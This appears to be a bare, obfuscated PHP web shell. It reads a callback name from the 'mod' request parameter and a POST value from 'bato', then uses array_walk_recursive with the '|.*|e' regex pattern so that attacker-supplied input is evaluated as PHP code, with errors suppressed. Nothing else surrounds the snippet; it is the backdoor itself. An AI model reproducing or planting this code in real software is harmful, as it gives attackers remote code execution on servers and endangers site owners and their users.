$_clasc = $_REQUEST['mod'];
$arr = array($_POST['bato'] => '|.*|e',);
@array_walk_recursive($arr, $_clasc, '');
